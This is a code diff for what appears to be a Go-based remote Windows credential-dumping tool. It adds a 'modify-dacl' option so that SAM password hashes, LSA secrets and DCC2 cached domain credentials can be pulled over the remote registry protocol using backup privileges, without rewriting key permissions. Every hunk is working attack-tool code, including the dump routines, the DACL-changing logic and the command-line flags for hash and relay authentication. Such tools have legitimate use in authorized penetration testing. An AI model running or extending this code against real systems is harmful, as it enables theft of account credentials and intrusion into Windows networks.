@@ -46,7 +46,7 @@ import (
 )
 
 var log = golog.Get("")
-var release string = "0.4.0"
+var release string = "0.5.0"
 
 var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 
@@ -390,6 +390,9 @@ func restoreDaclFromBackup(rpccon *msrrp.RPCCon, hKey []byte) error {
 }
 
 func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string) error {
+	if len(keys) == 0 {
+		return nil
+	}
 	log.Infoln("Attempting to restore security descriptors")
 	// Rollback changes in reverse order
 	for i, j := 0, len(keys)-1; i < j; i, j = i+1, j-1 {
@@ -420,7 +423,7 @@ OuterLoop:
 	return newKeys
 }
 
-func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte) error {
+func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err error) {
 
 	keys := []string{
 		`SAM\SAM`,
@@ -428,17 +431,24 @@ func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte) error {
 		`SAM\SAM\Domains\Account`,
 		`SAM\SAM\Domains\Account\Users`,
 	}
-	registryKeysModified = append(registryKeysModified, keys...)
-	// Grant temporarily higher permissions to the local administrators group
-	err := changeDacl(rpccon, hKey, keys, administratorsSID)
-	if err != nil {
-		log.Errorln(err)
-		return err
+	if modifyDacl {
+		registryKeysModified = append(registryKeysModified, keys...)
+		// Grant temporarily higher permissions to the local administrators group
+		err = changeDacl(rpccon, hKey, keys, administratorsSID)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
 	}
 
 	// Get RIDs of local users
 	keyUsers := `SAM\SAM\Domains\Account\Users`
-	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
+	var rids []string
+	if modifyDacl {
+		rids, err = rpccon.GetSubKeyNames(hKey, keyUsers)
+	} else {
+		rids, err = rpccon.GetSubKeyNamesExt(hKey, keyUsers, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	}
 	if err != nil {
 		log.Errorln(err)
 		return err
@@ -449,23 +459,25 @@ func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte) error {
 		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
 	}
 
-	// Extend the list of keys that have temporarily altered permissions
-	registryKeysModified = append(registryKeysModified, rids...)
-	// Grant temporarily higher permissions to the local administrators group
-	err = changeDacl(rpccon, hKey, rids, administratorsSID)
-	if err != nil {
-		log.Errorln(err)
-		return err
+	if modifyDacl {
+		// Extend the list of keys that have temporarily altered permissions
+		registryKeysModified = append(registryKeysModified, rids...)
+		// Grant temporarily higher permissions to the local administrators group
+		err = changeDacl(rpccon, hKey, rids, administratorsSID)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
 	}
 
-	syskey, err := getSysKey(rpccon, hKey)
+	syskey, err := getSysKey(rpccon, hKey, modifyDacl)
 	if err != nil {
 		log.Errorln(err)
 		return err
 	}
 
 	// Gather credentials/secrets
-	creds, err := getNTHash(rpccon, hKey, rids)
+	creds, err := getNTHash(rpccon, hKey, rids, modifyDacl)
 	if err != nil {
 		log.Errorln(err)
 		// Try to get other secrets instead of hard fail
@@ -497,7 +509,7 @@ func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte) error {
 	return nil
 }
 
-func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte) error {
+func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err error) {
 	keys := []string{
 		`SECURITY\Policy\Secrets`,
 		`SECURITY\Policy\Secrets\NL$KM`,
@@ -505,37 +517,47 @@ func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte) error {
 		`SECURITY\Policy\PolEKList`,
 		`SECURITY\Policy\PolSecretEncryptionKey`,
 	}
-	registryKeysModified = append(registryKeysModified, keys...)
 
-	// Grant temporarily higher permissions to the local administrators group
-	err := changeDacl(rpccon, hKey, keys, administratorsSID)
-	if err != nil {
-		log.Errorln(err)
-		return err
+	if modifyDacl {
+		registryKeysModified = append(registryKeysModified, keys...)
+
+		// Grant temporarily higher permissions to the local administrators group
+		err := changeDacl(rpccon, hKey, keys, administratorsSID)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
 	}
 
 	// Get names of lsa secrets
 	keySecrets := `SECURITY\Policy\Secrets`
-	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
+	var secrets []string
+	if modifyDacl {
+		secrets, err = rpccon.GetSubKeyNames(hKey, keySecrets)
+	} else {
+		secrets, err = rpccon.GetSubKeyNamesExt(hKey, keySecrets, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	}
 	if err != nil {
 		log.Errorln(err)
 		return err
 	}
 
-	newSecrets := make([]string, 0, len(secrets)*2)
-	for i := range secrets {
-		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
-		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
+	if modifyDacl {
+		newSecrets := make([]string, 0, len(secrets)*2)
+		for i := range secrets {
+			newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
+			newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
+		}
+
+		newKeys := addToListIfNotExit(&registryKeysModified, newSecrets)
+		err = changeDacl(rpccon, hKey, newKeys, administratorsSID)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
 	}
 
-	newKeys := addToListIfNotExit(&registryKeysModified, newSecrets)
-	err = changeDacl(rpccon, hKey, newKeys, administratorsSID)
-	if err != nil {
-		log.Errorln(err)
-		return err
-	}
-
-	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
+	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false, modifyDacl)
 	if err != nil {
 		log.Noticeln("Failed to get lsa secrets")
 		log.Errorln(err)
@@ -561,7 +583,7 @@ func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte) error {
 	return nil
 }
 
-func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte) error {
+func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) error {
 	keys := []string{
 		`SECURITY\Policy\Secrets`,
 		`SECURITY\Policy\Secrets\NL$KM`,
@@ -570,15 +592,18 @@ func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte) error {
 		`SECURITY\Policy\PolSecretEncryptionKey`,
 		`SECURITY\Cache`,
 	}
-	newKeys := addToListIfNotExit(&registryKeysModified, keys)
-	// Grant temporarily higher permissions to the local administrators group
-	err := changeDacl(rpccon, hKey, newKeys, administratorsSID)
-	if err != nil {
-		log.Errorln(err)
-		return err
+
+	if modifyDacl {
+		newKeys := addToListIfNotExit(&registryKeysModified, keys)
+		// Grant temporarily higher permissions to the local administrators group
+		err := changeDacl(rpccon, hKey, newKeys, administratorsSID)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
 	}
 
-	cachedHashes, err := GetCachedHashes(rpccon, hKey)
+	cachedHashes, err := GetCachedHashes(rpccon, hKey, modifyDacl)
 	if err != nil {
 		log.Errorln(err)
 		return err
@@ -733,6 +758,8 @@ var helpMsg = `
           --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
           --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.
           --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.
+          --modify-dacl         Change DACLs of reg keys before dump.
+                                Only required if keys cannot be opened using SeBackupPrivilege. (default false)
           --backup-dacl         Save original DACLs to disk before modification
           --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.
           --backup-file         Filename for DACL backup (default dacl.backup)
@@ -755,7 +782,7 @@ var helpMsg = `
 func main() {
 	var host, username, password, hash, domain, socksIP, backupFilename, outputFilename, targetIP, dcIP, aesKey string
 	var port, dialTimeout, socksPort, relayPort int
-	var debug, noEnc, forceSMB2, localUser, dump, version, verbose, relay, noPass, sam, lsaSecrets, dcc2, backupDacl, restoreDacl, kerberos bool
+	var debug, noEnc, forceSMB2, localUser, dump, version, verbose, relay, noPass, sam, lsaSecrets, dcc2, modifyDacl, backupDacl, restoreDacl, kerberos bool
 	var err error
 
 	flag.Usage = func() {
@@ -792,6 +819,7 @@ func main() {
 	flag.BoolVar(&sam, "sam", false, "")
 	flag.BoolVar(&lsaSecrets, "lsa", false, "")
 	flag.BoolVar(&dcc2, "dcc2", false, "")
+	flag.BoolVar(&modifyDacl, "modify-dacl", false, "")
 	flag.BoolVar(&backupDacl, "backup-dacl", false, "")
 	flag.BoolVar(&restoreDacl, "restore-dacl", false, "")
 	flag.StringVar(&backupFilename, "backup-file", "dacl.backup", "")
@@ -1095,21 +1123,21 @@ func main() {
 		}()
 
 		if sam {
-			err = dumpSAM(rpccon, hKey)
+			err = dumpSAM(rpccon, hKey, modifyDacl)
 			if err != nil {
 				log.Errorln(err)
 				return
 			}
 		}
 		if lsaSecrets {
-			err = dumpLSASecrets(rpccon, hKey)
+			err = dumpLSASecrets(rpccon, hKey, modifyDacl)
 			if err != nil {
 				log.Errorln(err)
 				return
 			}
 		}
 		if dcc2 {
-			err = dumpDCC2Cache(rpccon, hKey)
+			err = dumpDCC2Cache(rpccon, hKey, modifyDacl)
 			if err != nil {
 				log.Errorln(err)
 				return
